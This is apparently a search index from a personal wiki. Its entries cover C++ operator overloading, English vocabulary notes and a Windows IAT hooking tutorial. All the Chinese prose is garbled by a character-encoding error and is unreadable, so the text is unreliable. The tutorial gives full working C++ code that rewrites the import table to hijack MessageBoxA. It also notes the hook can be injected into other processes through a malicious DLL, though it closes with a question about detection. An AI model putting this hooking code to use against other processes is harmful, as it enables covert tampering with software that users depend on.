b.value);&#125;æ¶‰åŠæ¯”è¾ƒçš„ï¼Œæ¯”è¾ƒç»“æœæ˜¯boolå¸ƒå°”å€¼ï¼Œè¦ä¹ˆçœŸè¦ä¹ˆå‡ï¼Œè¿”å›boolç±»å‹æœ€åˆé€‚ï¼Œä¸”ä¸¤ä¸ªæ¯”è¾ƒçš„æ•°æ²¡æœ‰å‘ç”Ÿå˜åŒ–1234567891011//æˆå‘˜å‡½æ•°å½¢å¼bool operator&gt;(const MyNumber&amp; other) &#123; return value &gt; other.value;&#125; //å‹å…ƒå‡½æ•°å½¢å¼bool operator&gt;(const MyNumber&amp; a, const MyNumber&amp; b)&#123; return a.value &gt; b.value;&#125;è¿ç®—ç»“æœä¼šä¿®æ”¹åˆ°å¯¹è±¡æœ¬èº«ï¼Œé€šå¸¸è¿”å›å¼•ç”¨æ˜¯åˆé€‚çš„ï¼ˆå¦‚ ++ æˆ– --ï¼‰ä½†è¿™é‡Œè¿˜è¦æ³¨æ„å‰ç¼€å’Œåç¼€çš„å·¥ä½œæœºåˆ¶åŒºåˆ« ä»€ä¹ˆæƒ…å†µä¸‹ï¼Œè¿ç®—ç¬¦é‡è½½ä¸€å®šè¦ç”¨åˆ°å‹å…ƒå‡½æ•°ï¼Ÿ å‚è€ƒç­”æ¡ˆéœ€è¦åœ¨ç±»å¤–éƒ¨è®¿é—®ç±»çš„ç§æœ‰æˆ–å—ä¿æŠ¤çš„æˆå‘˜æ—¶ï¼Œéœ€è¦ä½¿ç”¨å‹å…ƒå‡½æ•°ã€‚ä¸€ä¸ªå…¸å‹çš„ä¾‹å­æ˜¯é‡è½½è¾“å…¥è¾“å‡ºè¿ç®—ç¬¦ï¼ˆ&lt;&lt; å’Œ &gt;&gt;ï¼‰ï¼Œå› ä¸ºæ ‡å‡†è¾“å…¥è¾“å‡ºæµï¼ˆä¾‹å¦‚ std::ostream å’Œ std::istreamï¼‰ä¸æ˜¯ç±»çš„æˆå‘˜ã€‚æ›´å®½æ³›çš„æƒ…å†µï¼šåˆ«äººå·²ç»å†™å¥½çš„è¿ç®—ç¬¦ï¼Œæˆ‘è¦æ‹¿æ¥é‡è½½ï¼Œåªèƒ½æ˜¯å‹å…ƒçš„å½¢å¼ã€‚æ­¤å¤–ï¼Œå¦‚æœéœ€è¦è®©è¿ç®—ç¬¦çš„è¡Œä¸ºå¯¹äºå·¦å³æ“ä½œæ•°æ˜¯å¯¹ç§°çš„ï¼ˆä¾‹å¦‚ï¼Œa + b å’Œ b + a åº”è¯¥æœ‰ç›¸åŒçš„è¡Œä¸ºï¼‰ï¼Œé‚£ä¹ˆä½¿ç”¨å‹å…ƒå‡½æ•°é€šå¸¸æ›´ä¸ºåˆé€‚ã€‚è¿™å¥è¯çš„æ„æ€æ˜¯ï¼šåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›è¿ç®—ç¬¦å¯¹å…¶ä¸¤è¾¹çš„æ“ä½œæ•°å…·æœ‰ç›¸åŒçš„å¤„ç†æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯å½“è¿™äº›æ“ä½œæ•°å¯èƒ½å±äºä¸åŒçš„ç±»å‹æ—¶ã€‚ä½¿ç”¨å‹å…ƒå‡½æ•°å¯ä»¥æ›´å®¹æ˜“åœ°å®ç°è¿™ç§å¯¹ç§°æ€§ï¼Œå› ä¸ºå‹å…ƒå‡½æ•°ä¸æ˜¯ç±»çš„æˆå‘˜å‡½æ•°ï¼Œå®ƒä»¬å¯ä»¥å¯¹ä¸¤ä¸ªæ“ä½œæ•°è¿›è¡Œç›¸ç­‰çš„å¤„ç†ã€‚ä»¥åŠ æ³•è¿ç®—ç¬¦ä¸ºä¾‹ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª MyNumber ç±»å’Œä¸€ä¸ªæ•´æ•°ç±»å‹ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿä¸ä»…å®ç° MyNumber + intï¼Œè¿˜è¦å®ç° int + MyNumberï¼Œä¸”è¿™ä¸¤ä¸ªæ“ä½œæœ‰ç›¸åŒçš„è¡Œä¸ºã€‚å¦‚æœæˆ‘ä»¬åªåœ¨ MyNumber ç±»ä¸­å®ç°åŠ æ³•è¿ç®—ç¬¦ï¼Œæˆ‘ä»¬åªèƒ½é‡è½½ MyNumber + intï¼Œè€Œä¸èƒ½ç›´æ¥é‡è½½ int + MyNumberã€‚é€šè¿‡ä½¿ç”¨å‹å…ƒå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åŒæ—¶å®ç°è¿™ä¸¤ç§æƒ…å†µã€‚12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;class MyNumber &#123;public: int value; MyNumber(int v) : value(v) &#123;&#125; // ä½¿ç”¨å‹å…ƒå‡½æ•°æ¥é‡è½½åŠ æ³•è¿ç®—ç¬¦ friend MyNumber operator+(const MyNumber&amp; a, const MyNumber&amp; b) &#123; return MyNumber(a.value + b.value); &#125; // é‡è½½ MyNumber + int friend MyNumber operator+(const MyNumber&amp; a, int b) &#123; return MyNumber(a.value + b); &#125; // é‡è½½ int + MyNumber friend MyNumber operator+(int a, const MyNumber&amp; b) &#123; return MyNumber(a + b.value); &#125;&#125;;int main() &#123; MyNumber num1(5); MyNumber sum1 = num1 + 3; // è°ƒç”¨ operator+(MyNumber, int) MyNumber sum2 = 3 + num1; // è°ƒç”¨ operator+(int, MyNumber) std::cout &lt;&lt; &quot;sum1: &quot; &lt;&lt; sum1.value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;sum2: &quot; &lt;&lt; sum2.value &lt;&lt; std::endl; return 0;&#125;åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åˆ†åˆ«é‡è½½äº† MyNumber + int å’Œ int + MyNumberã€‚è¿™ä¸¤ä¸ªè¿ç®—ç¬¦è™½ç„¶æ“ä½œæ•°çš„é¡ºåºä¸åŒï¼Œä½†æ˜¯å®ƒä»¬æ‰§è¡Œç›¸åŒçš„æ“ä½œï¼ˆå³å°†ä¸€ä¸ª MyNumber å¯¹è±¡å’Œä¸€ä¸ªæ•´æ•°ç›¸åŠ ï¼‰ã€‚ä½¿ç”¨å‹å…ƒå‡½æ•°å¯ä»¥è®©æˆ‘ä»¬æ›´æ–¹ä¾¿åœ°å®ç°è¿™ç§å¯¹ç§°æ€§ã€‚"},{"title":"éŸ³æ ‡","path":"/wiki/English/éŸ³æ ‡.html","content":"å¸¸çŠ¯é”™æ··æ·†çš„ï¼š [u]å’Œ[u:] proof prove reveal review ï¼ˆåé¢è¡¥ä¸ŠéŸ³æ ‡ï¼‰ è¿è¯»éš¾å¬å‡ºæ¥çš„ï¼š If you**'re** busy next weekend,we can play it by ear. You**'ve** got to get into this hot tub.The water feels amazing. If you**'re** starting to panic,take a deep breath.Itâ€™ll help you relax."},{"title":"IAT Hook","path":"/wiki/Hook/IAT_Hook.html","content":"åŸç† exeæ–‡ä»¶åœ¨åŠ è½½åIATè¡¨ä¼šæ›´æ–°ä¸ºå®é™…çš„å‡½æ•°åœ°å€ã€‚æˆ‘ä»¬å°†IATè¡¨è¡¨ä¸­çš„å‡½æ•°åœ°å€ä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±çš„å‡½æ•°åœ°å€ï¼Œå³ä¸ºIAT Hookã€‚ æ³¨æ„äº‹é¡¹ ä»æ±‡ç¼–ä»£ç çš„è§’åº¦çœ‹ï¼Œä¸ºä¿æŒå †æ ˆå¹³è¡¡ã€‚å‡å†’å‡½æ•°ï¼ˆDetourå‡½æ•°ï¼‰çš„è°ƒç”¨çº¦å®šï¼ˆè¿™ä¼šå½±å“å¤–å¹³æ ˆè¿˜æ˜¯å†…å¹³æ ˆï¼‰ã€å‚æ•°ä¸ªæ•°ã€è¿”å›å€¼ç±»å‹è¦ä¸è¢«Hookå‡½æ•°ä¸€è‡´ IATè¡¨è¡¨é¡¹æ˜¯åªè¯»çš„ï¼ŒHookå‰éœ€è¦å°†è¿™å—å†…å­˜ç”¨VirtualProtectæ”¹ä¸ºå¯å†™ï¼Œå®ŒæˆHookåå†å°†å†…å­˜é¡µå±æ€§æ”¹å›å» ä»£ç å®ç° ä»¥Hookè‡ªèº«çš„MessageBoxAå‡½æ•°ä¸ºä¾‹ï¼Œå…·ä½“æ­¥éª¤æ˜¯ è·å¾—è‡ªèº«æ¨¡å—åŸºå€å éå†IATè¡¨ï¼Œä½¿ç”¨_stricmpä¸åŒºåˆ†å¤§å°å†™å¯¹æ¯”å¯¹å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°æè¿°user32.dllçš„å¯¼å…¥è¡¨ åœ¨è¯¥å¯¼å…¥è¡¨çš„IATè¡¨ä¸­æŸ¥æ‰¾è¡¨é¡¹ä¸ºMessageBoxAå‡½æ•°åœ°å€çš„IATè¡¨é¡¹ å°†è¯¥è¡¨é¡¹ä¿®æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±Hookå‡½æ•°çš„åœ°å€ æˆ‘ä»¬å‡å†’çš„MessageBoxAå‡½æ•°HookIATå‡½æ•°å¸è½½Hookä¸»å‡½æ•° æ‰“å°è¾“å‡ºï¼Œè¡¨æ˜è¢«Hookã€‚ æ­£å¸¸è°ƒç”¨åŸæ¥çš„MessageBoxAï¼Œåªä¸è¿‡å°†æ˜¾ç¤ºæ–‡å­—ä¿®æ”¹æˆâ€œHooked!â€ 1234567// Detourå‡½æ•° å‡å†’çš„int WINAPI HookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)&#123; printf(&quot;HookedMessageBoxA called! &quot;); return g_pOriginalMessageBoxA(hWnd, &quot;Hooked!&quot;, lpCaption, uType);&#125;é€šè¿‡GetProcAddresså¾—åˆ°è¦Hookçš„APIå‡½æ•°çš„å‡½æ•°åœ°å€1GetProcAddress(GetModuleHandleA(targetModuleName), targetFunctionName) è·å¾—å‡½æ•°åœ°å€åï¼Œåœ¨æè¿°user32.dllçš„é‚£ä¸ªå¯¼å…¥è¡¨ä¸­ï¼ŒæŸ¥æ‰¾IATè¡¨ä¸­ä¸MessageBoxAå‡½æ•°åœ°å€ç›¸ç­‰çš„IATè¡¨é¡¹ï¼Œè¿›è¡Œæ›¿æ¢ äº‹å®ä¸Šï¼Œä¸éœ€è¦ç”¨user32.dllæ¥æ‰¾å¯¼å…¥è¡¨ã€‚ç›´æ¥å¯¹æ‰€æœ‰å¯¼å…¥è¡¨ä¸­çš„æ‰€æœ‰IATè¡¨é¡¹çš„å‡½æ•°åœ°å€è¿›è¡Œæ¯”å¯¹ä¹Ÿè¡Œ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// æŸ¥æ‰¾IATè¡¨å¹¶è¿›è¡Œæ›¿æ¢void HookIAT(const char* targetModuleName, const char* targetFunctionName, void* pNewFunction)&#123; if (g_isHooked) &#123; printf(&quot;%s in %s is already hooked &quot;, targetFunctionName, targetModuleName); return; &#125; HMODULE hModule = GetModuleHandle(NULL); if (!hModule) &#123; printf(&quot;Failed to get module handle &quot;); return; &#125; auto pDosHeader = (PIMAGE_DOS_HEADER)hModule; auto pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader-&gt;e_lfanew); auto pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // éå†å¯¼å…¥è¡¨ while (pImportDescriptor-&gt;Name) // å¯¹äºæ¯å¼ å¯¼å…¥è¡¨æ‰€æè¿°çš„dll &#123; const char* pModuleName = (const char*)((BYTE*)hModule + pImportDescriptor-&gt;Name); if (_stricmp(pModuleName, targetModuleName) == 0) //ä¸åŒºåˆ†å¤§å°å†™æ¯”è¾ƒä¸¤å­—ç¬¦ä¸² &#123; auto pThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDescriptor-&gt;FirstThunk); //IATè¡¨ while (pThunk-&gt;u1.Function) &#123; FARPROC* pFunc = (FARPROC*)&amp;pThunk-&gt;u1.Function; // æŸ¥æ‰¾ç›®æ ‡å‡½æ•° if (*pFunc == GetProcAddress(GetModuleHandleA(targetModuleName), targetFunctionName)) &#123; // ä¿å­˜åŸå§‹å‡½æ•°æŒ‡é’ˆ g_pOriginalMessageBoxA = (MessageBoxA_t)*pFunc; // ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ DWORD dwOldProtect; VirtualProtect(pFunc, sizeof(void*), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); *pFunc = (FARPROC)pNewFunction; //æ›¿æ¢ä¸ºæˆ‘ä»¬å‡å†’çš„å‡½æ•° VirtualProtect(pFunc, sizeof(void*), dwOldProtect, &amp;dwOldProtect); printf(&quot;Hooked %s in %s &quot;, targetFunctionName, targetModuleName); g_isHooked = true; return; &#125; pThunk++; &#125; &#125; pImportDescriptor++; &#125;&#125;å¸è½½çš„ä»£ç å’ŒHookå·®ä¸å¤šï¼Œå°±æ˜¯ä¿®æ”¹å‡½æ•°åœ°å€æ—¶ä¿®æ”¹å›å»ï¼Œä»…æ­¤è€Œå·² 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// å¸è½½Hookå¹¶æ¢å¤åŸå§‹å‡½æ•°void UnhookIAT(const char* targetModuleName, const char* targetFunctionName)&#123; if (!g_isHooked) &#123; printf(&quot;%s in %s is not hooked &quot;, targetFunctionName, targetModuleName); return; &#125; HMODULE hModule = GetModuleHandle(NULL); if (!hModule) &#123; printf(&quot;Failed to get module handle &quot;); return; &#125; auto pDosHeader = (PIMAGE_DOS_HEADER)hModule; auto pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader-&gt;e_lfanew); auto pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // éå†å¯¼å…¥è¡¨ while (pImportDescriptor-&gt;Name) // å¯¹äºæ¯å¼ å¯¼å…¥è¡¨æ‰€æè¿°çš„dll &#123; const char* pModuleName = (const char*)((BYTE*)hModule + pImportDescriptor-&gt;Name); if (_stricmp(pModuleName, targetModuleName) == 0) //ä¸åŒºåˆ†å¤§å°å†™æ¯”è¾ƒä¸¤å­—ç¬¦ä¸² &#123; auto pThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDescriptor-&gt;FirstThunk); //IATè¡¨ while (pThunk-&gt;u1.Function) &#123; FARPROC* pFunc = (FARPROC*)&amp;pThunk-&gt;u1.Function; // æŸ¥æ‰¾å·²Hookçš„å‡½æ•° if (*pFunc == (FARPROC)HookedMessageBoxA) &#123; // æ¢å¤åŸå§‹å‡½æ•°æŒ‡é’ˆ DWORD dwOldProtect; VirtualProtect(pFunc, sizeof(void*), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); *pFunc = (FARPROC)g_pOriginalMessageBoxA; //è¿˜åŸå‡½æ•°åœ°å€ VirtualProtect(pFunc, sizeof(void*), dwOldProtect, &amp;dwOldProtect); printf(&quot;Unhooked %s in %s &quot;, targetFunctionName, targetModuleName); g_isHooked = false; return; &#125; pThunk++; &#125; &#125; pImportDescriptor++; &#125;&#125;æµç¨‹ Hookå‰ï¼Œæ­£å¸¸å¼¹çª—ï¼Œçª—å£å†…å®¹ä¸º&quot;Test before hooking&quot; è¿›è¡ŒHookï¼Œå†æ¬¡å¼¹çª—ï¼Œçª—å£å†…å®¹åº”ä¸º&quot;IAT Hook&quot;ï¼Œä½†ä¼šè¢«Hookä¸º&quot;Hooked!&quot; å¸è½½Hookï¼Œå†æ¬¡å¼¹çª—ï¼Œçª—å£å†…å®¹ä¸º&quot;Test after unhooking&quot;ï¼Œè¡¨æ˜å¸è½½HookæˆåŠŸ 123456789101112131415161718192021int main()&#123; // Hookå‰çš„æµ‹è¯• printf(&quot;Before hooking MessageBoxA... &quot;); MessageBoxA(NULL, &quot;Test before hooking&quot;, &quot;IAT Hook&quot;, MB_OK); printf(&quot; &quot;); // Hook MessageBoxAå‡½æ•° printf(&quot;Hooking MessageBoxA... &quot;); HookIAT(&quot;user32.dll&quot;, &quot;MessageBoxA&quot;, HookedMessageBoxA); MessageBoxA(NULL, &quot;Test&quot;, &quot;IAT Hook&quot;, MB_OK); // æµ‹è¯•æ˜¯å¦HookæˆåŠŸ printf(&quot; &quot;); // å¸è½½é’©å­å¹¶æ¢å¤åŸå§‹å‡½æ•° printf(&quot;Unhooking MessageBoxA... &quot;); UnhookIAT(&quot;user32.dll&quot;, &quot;MessageBoxA&quot;); MessageBoxA(NULL, &quot;Test after unhooking&quot;, &quot;IAT Hook&quot;, MB_OK); //æ£€æŸ¥æ˜¯å¦æˆåŠŸæ¢å¤ printf(&quot; &quot;); return 0;&#125; å®Œæ•´ä»£ç æ”¯æŒx86å’Œx64123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#include &lt;windows.h&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;using MessageBoxA_t = int (WINAPI*)(HWND, LPCSTR, LPCSTR, UINT);MessageBoxA_t g_pOriginalMessageBoxA = NULL;bool g_isHooked = false; // æ˜¯å¦Hookè¿‡ é˜²æ­¢è¿ç»­Hookï¼Œé‚£ä¹ˆç¬¬äºŒæ¬¡Hookå°±çŸ¥é“å·²ç»Hookè¿‡äº†int WINAPI HookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);void HookIAT(const char* targetModuleName, const char* targetFunctionName, void* pNewFunction);void UnhookIAT(const char* targetModuleName, const char* targetFunctionName);int main()&#123; // Hookå‰çš„æµ‹è¯• printf(&quot;Before hooking MessageBoxA... &quot;); MessageBoxA(NULL, &quot;Test before hooking&quot;, &quot;IAT Hook&quot;, MB_OK); printf(&quot; &quot;); // Hook MessageBoxAå‡½æ•° printf(&quot;Hooking MessageBoxA... &quot;); HookIAT(&quot;user32.dll&quot;, &quot;MessageBoxA&quot;, HookedMessageBoxA); MessageBoxA(NULL, &quot;Test&quot;, &quot;IAT Hook&quot;, MB_OK); // æµ‹è¯•æ˜¯å¦HookæˆåŠŸ printf(&quot; &quot;); // å¸è½½é’©å­å¹¶æ¢å¤åŸå§‹å‡½æ•° printf(&quot;Unhooking MessageBoxA... &quot;); UnhookIAT(&quot;user32.dll&quot;, &quot;MessageBoxA&quot;); MessageBoxA(NULL, &quot;Test after unhooking&quot;, &quot;IAT Hook&quot;, MB_OK); //æ£€æŸ¥æ˜¯å¦æˆåŠŸæ¢å¤ printf(&quot; &quot;); return 0;&#125;// Detourå‡½æ•° å‡å†’çš„int WINAPI HookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)&#123; printf(&quot;HookedMessageBoxA called! &quot;); return g_pOriginalMessageBoxA(hWnd, &quot;Hooked!&quot;, lpCaption, uType);&#125;// æŸ¥æ‰¾IATè¡¨å¹¶è¿›è¡Œæ›¿æ¢void HookIAT(const char* targetModuleName, const char* targetFunctionName, void* pNewFunction)&#123; if (g_isHooked) &#123; printf(&quot;%s in %s is already hooked &quot;, targetFunctionName, targetModuleName); return; &#125; HMODULE hModule = GetModuleHandle(NULL); if (!hModule) &#123; printf(&quot;Failed to get module handle &quot;); return; &#125; auto pDosHeader = (PIMAGE_DOS_HEADER)hModule; auto pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader-&gt;e_lfanew); auto pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // éå†å¯¼å…¥è¡¨ while (pImportDescriptor-&gt;Name) // å¯¹äºæ¯å¼ å¯¼å…¥è¡¨æ‰€æè¿°çš„dll &#123; const char* pModuleName = (const char*)((BYTE*)hModule + pImportDescriptor-&gt;Name); if (_stricmp(pModuleName, targetModuleName) == 0) //ä¸åŒºåˆ†å¤§å°å†™æ¯”è¾ƒä¸¤å­—ç¬¦ä¸² &#123; auto pThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDescriptor-&gt;FirstThunk); //IATè¡¨ while (pThunk-&gt;u1.Function) &#123; FARPROC* pFunc = (FARPROC*)&amp;pThunk-&gt;u1.Function; // æŸ¥æ‰¾ç›®æ ‡å‡½æ•° if (*pFunc == GetProcAddress(GetModuleHandleA(targetModuleName), targetFunctionName)) &#123; // ä¿å­˜åŸå§‹å‡½æ•°æŒ‡é’ˆ g_pOriginalMessageBoxA = (MessageBoxA_t)*pFunc; // ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ DWORD dwOldProtect; VirtualProtect(pFunc, sizeof(void*), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); *pFunc = (FARPROC)pNewFunction; //æ›¿æ¢ä¸ºæˆ‘ä»¬å‡å†’çš„å‡½æ•° VirtualProtect(pFunc, sizeof(void*), dwOldProtect, &amp;dwOldProtect); printf(&quot;Hooked %s in %s &quot;, targetFunctionName, targetModuleName); g_isHooked = true; return; &#125; pThunk++; &#125; &#125; pImportDescriptor++; &#125;&#125;// å¸è½½Hookå¹¶æ¢å¤åŸå§‹å‡½æ•°void UnhookIAT(const char* targetModuleName, const char* targetFunctionName)&#123; if (!g_isHooked) &#123; printf(&quot;%s in %s is not hooked &quot;, targetFunctionName, targetModuleName); return; &#125; HMODULE hModule = GetModuleHandle(NULL); if (!hModule) &#123; printf(&quot;Failed to get module handle &quot;); return; &#125; auto pDosHeader = (PIMAGE_DOS_HEADER)hModule; auto pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader-&gt;e_lfanew); auto pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // éå†å¯¼å…¥è¡¨ while (pImportDescriptor-&gt;Name) // å¯¹äºæ¯å¼ å¯¼å…¥è¡¨æ‰€æè¿°çš„dll &#123; const char* pModuleName = (const char*)((BYTE*)hModule + pImportDescriptor-&gt;Name); if (_stricmp(pModuleName, targetModuleName) == 0) //ä¸åŒºåˆ†å¤§å°å†™æ¯”è¾ƒä¸¤å­—ç¬¦ä¸² &#123; auto pThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDescriptor-&gt;FirstThunk); //IATè¡¨ while (pThunk-&gt;u1.Function) &#123; FARPROC* pFunc = (FARPROC*)&amp;pThunk-&gt;u1.Function; // æŸ¥æ‰¾å·²Hookçš„å‡½æ•° if (*pFunc == (FARPROC)HookedMessageBoxA) &#123; // æ¢å¤åŸå§‹å‡½æ•°æŒ‡é’ˆ DWORD dwOldProtect; VirtualProtect(pFunc, sizeof(void*), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); *pFunc = (FARPROC)g_pOriginalMessageBoxA; //è¿˜åŸå‡½æ•°åœ°å€ VirtualProtect(pFunc, sizeof(void*), dwOldProtect, &amp;dwOldProtect); printf(&quot;Unhooked %s in %s &quot;, targetFunctionName, targetModuleName); g_isHooked = false; return; &#125; pThunk++; &#125; &#125; pImportDescriptor++; &#125;&#125; è¿è¡Œæµ‹è¯• Hookå‰ï¼šæ­£å¸¸å¼¹çª—ï¼Œçª—å£å†…å®¹ä¸º&quot;Test before hooking&quot; è¿›è¡ŒHookï¼šå†æ¬¡å¼¹çª—ï¼Œçª—å£å†…å®¹åº”ä¸º&quot;IAT Hook&quot;ï¼Œä½†ä¼šè¢«Hookä¸º&quot;Hooked!&quot; å¸è½½Hookï¼šå†æ¬¡å¼¹çª—ï¼Œçª—å£å†…å®¹ä¸º&quot;Test after unhooking&quot;ï¼Œè¡¨æ˜å¸è½½HookæˆåŠŸ è§‚å¯Ÿåˆ°å¦‚ä¸‹ä¸¤ç‚¹è¯´æ˜ä»£ç æ­£ç¡® Hookåï¼šå¼¹çª—æ–‡å­—è¢«æ›¿æ¢ å¸è½½Hookåï¼šèƒ½æ­£å¸¸å¼¹çª—ä¸”å¼¹çª—æ–‡å­—æ²¡å˜ è¢«Hookå¸è½½Hook å°ç»“ é€šè¿‡GetProcAddressè·å–ç›®æ ‡APIå‡½æ•°åœ°å€ éå†å¯¼å…¥è¡¨ ä½¿ç”¨_stricmpè¿›è¡Œä¸åŒºåˆ†å¤§å°å†™çš„å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ‰¾åˆ°æŒ‡å®šçš„Dllçš„å¯¼å…¥è¡¨ éå†è¯¥å¯¼å…¥è¡¨çš„IATè¡¨é¡¹ï¼Œæ‰¾åˆ°ç›®æ ‡å‡½æ•°åœ°å€ ä¿®æ”¹IATè¡¨è¡¨é¡¹ ä¿®æ”¹å‰è¦ç”¨VirtualProtectå°†å†…å­˜é¡µå±æ€§æ”¹ä¸ºå¯å†™ï¼Œä¿®æ”¹å‡½æ•°åœ°å€åå†æ”¹å›åªè¯» å±€é™ IAT Hookä»…å¯¹IATè¡¨ä¸­çš„å‡½æ•°åœ°å€æœ‰æ•ˆã€‚é˜²å¾¡æ–¹å¯ä»¥åšåˆ°ä¸é€šè¿‡IATè¡¨æ¥å®ç°APIå‡½æ•°çš„è°ƒç”¨ï¼š ç›´æ¥è°ƒç”¨å‡½æ•°ï¼šé€šè¿‡å…¶ä»–æ–¹å¼è°ƒç”¨APIå‡½æ•°ï¼Œè€Œä¸æ˜¯é€šè¿‡IATè¡¨ã€‚ä¾‹å¦‚ï¼ŒåŠ¨æ€åŠ è½½åº“å¹¶è·å–å‡½æ•°åœ°å€åç›´æ¥è°ƒç”¨ã€‚ é™æ€é“¾æ¥ï¼šç¼–è¯‘æ—¶æœªä½¿ç”¨IATè¡¨å¼•ç”¨å‡½æ•°åœ°å€ï¼Œä»è€Œé¿å…åœ¨IATè¡¨ä¸­å‡ºç°ç›®æ ‡å‡½æ•°åœ°å€ã€‚ ç§»é™¤IATè¡¨é¡¹ï¼šåœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œæ‰‹åŠ¨ç§»é™¤IATè¡¨ä¸­çš„ç‰¹å®šé¡¹ï¼Œä»¥é˜²æ­¢è¿™äº›é¡¹è¢«Hookã€‚ å¯¹å…¶ä»–è¿›ç¨‹è¿›è¡ŒIAT Hook æŠŠä¸Šé¢Hookçš„ä»£ç ä»¥Dllæˆ–ä»£ç çš„å½¢å¼æ³¨å…¥åˆ°å…¶ä»–è¿›ç¨‹ï¼Œåˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ¥æ‰§è¡Œä»£ç ï¼Œå°±èƒ½å¯¹å…¶ä»–è¿›ç¨‹è¿›è¡ŒIAT Hookäº† æ€è€ƒ IATè¡¨ä¸­ç³»ç»ŸAPIçš„å‡½æ•°åœ°å€é€šå¸¸åœ¨é«˜åœ°å€èŒƒå›´å†…ã€‚å½“æˆ‘ä»¬å°†IATè¡¨ä¸­çš„å‡½æ•°åœ°å€æ›¿æ¢ä¸ºè‡ªå·±çš„Detourå‡½æ•°åœ°å€æ—¶ï¼ŒDetourå‡½æ•°çš„åœ°å€é€šå¸¸ä¼šåœ¨è¾ƒä½çš„åœ°å€èŒƒå›´å†…ï¼ˆä¾‹å¦‚ï¼Œåœ¨æˆ‘ä»¬çš„æ¶æ„DLLä¸­ï¼‰ã€‚è¿™ç§åœ°å€çš„ä¸ä¸€è‡´æ€§åœ¨IATè¡¨ä¸­å¯èƒ½æ˜¾å¾—éå¸¸æ˜¾çœ¼ï¼Œå› ä¸ºIATè¡¨ä¸­å…¶ä»–å‡½æ•°åœ°å€éƒ½åœ¨é«˜åœ°å€èŒƒå›´å†…ã€‚ è¿™æ˜¯å¦å¯ä»¥ä½œä¸ºä¸€ç§æ£€æµ‹å’Œé˜²å¾¡IAT Hookçš„æ–¹å¼å‘¢ï¼Ÿ"},{"title":"ç§¯ç´¯æ‘˜æŠ„æœ¬","path":"/wiki/English/ç§¯ç´¯æ‘˜æŠ„æœ¬.html","content":"å•è¯ precise nostalgic reminisce dissï¼ˆYouâ€™re dissed.ï¼‰ handleï¼ˆI will ï¼‰ faucetï¼Œä¾‹ï¼šWhy is no water coming out of this faucet? sinkï¼Œä¾‹ï¼šExcuse me.There are insects coming out of the sink in my room. çŸ­è¯­ get a hold of long story short é•¿è¯çŸ­è¯´ play tagæ‰è¿·è— hide and seekæ‰è¿·è— play equipment takes one to know one get in shapeï¼Œä¾‹ï¼šItâ€™s a quick and easy way to get in shape. å¥å­ For aches,this medicine needs to be taken once a day. ç–¼ç—›acheï¼Œå¤æ•°+äº†s Someone less dedicated would have quit months ago. ä¸é‚£ä¹ˆæ•¬ä¸šçš„äººæ—©åœ¨å‡ ä¸ªæœˆå‰å°±è¾èŒäº†"},{"title":"åˆ†æ”¯è¯­å¥","path":"/wiki/C++_disassembly/åˆ†æ”¯è¯­å¥_C++_disassembly.html","content":"ifè¯­å¥ ifè¯­å¥æ ¹æ®æ‹¬å·ä¸­è¡¨è¾¾å¼è¯­å¥çš„å€¼å†³å®šæ˜¯å¦æ‰§è¡Œè¯­å¥å—ï¼š å¦‚æœè¡¨è¾¾å¼ä¸ºçœŸå€¼ï¼ˆé0ï¼‰ï¼Œåˆ™è¿›å…¥ifè¯­å¥å—æ‰§è¡Œï¼› 